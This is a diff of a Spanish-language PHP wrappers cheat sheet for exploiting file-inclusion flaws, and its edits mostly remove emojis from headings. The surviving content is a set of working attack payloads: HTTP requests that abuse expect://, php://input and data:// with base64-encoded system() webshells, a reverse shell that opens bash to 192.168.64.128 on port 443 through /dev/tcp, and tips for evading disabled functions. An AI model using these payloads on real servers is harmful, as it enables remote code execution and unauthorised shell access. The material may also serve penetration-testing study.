@@ -1,11 +1,9 @@
 -- - 
 ---
 
-### 🛠️ **PHP Wrappers Cheat Sheet**
+### **PHP Wrappers Cheat Sheet**
 
----
-
-#### 🔗 **Wrappers para Manejo de Archivos**
+#### **Wrappers para Manejo de Archivos**
 
 Los **wrappers en PHP** permiten acceder a recursos y realizar operaciones mediante flujos específicos.  
 Aquí tienes algunos de los más útiles:
@@ -18,16 +16,16 @@ Aquí tienes algunos de los más útiles:
 
 ---
 
-#### 💥 **Wrappers para RCE (Remote Command Execution)**
+#### 💥 Wrappers para RCE (Remote Command Execution)**
 
-##### 🔧 **1. `expect://` (para ejecutar comandos):**
+##### **1. `expect://` (para ejecutar comandos):**
 ```http
 GET /?filename=expect://whoami HTTP/1.1
 ```
 
 ---
 
-##### 📝 **2. `php://input` (inyectar comandos desde el cuerpo de la solicitud):**
+##### **2. `php://input` (inyectar comandos desde el cuerpo de la solicitud):**
 ```http
 GET /?filename=php://input HTTP/1.1
 
@@ -37,18 +35,18 @@ GET /?filename=php://input HTTP/1.1
 
 ---
 
-##### 📝 **3. `data://` (inyectar código en base64):**
+##### **3. `data://` (inyectar código en base64):**
 ```http
 GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4= HTTP/1.1
 ```
-- 🔍 **Decodificado:**
+- **Decodificado:**
   ```php
   <?php system('whoami'); ?>
   ```
 
 ---
 
-##### 🧨 **4. `data://` (inyectar comandos desde GET):**
+##### **4. `data://` (inyectar comandos desde GET):**
 ```http
 GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami HTTP/1.1
 ```
@@ -59,7 +57,7 @@ GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%
 
 ---
 
-##### 🪝 **5. Reverse Shell con `data://`**
+##### **5. Reverse Shell con `data://`**
 ```http
 GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.64.128/443+0>%261' HTTP/1.1
 ```
@@ -67,12 +65,12 @@ GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%
   ```php
   <?php system($_GET["cmd"]); ?>
   ```
-- 💡 **Nota:**  
+- **Nota:**  
   `%2b` representa el símbolo `+` en formato URL-encoded.
 
 ---
 
-### 💡 **Tips de Explotación:**
+### **Tips de Explotación:**
 - Prueba distintas combinaciones de **wrappers y métodos HTTP**.  
 - Algunos servidores permiten usar **wrappers en funciones como `file_get_contents()` o `include`**.  
 - Si el servidor tiene funciones deshabilitadas (`disable_functions`), intenta otros métodos de ejecución o concatenación de comandos.  
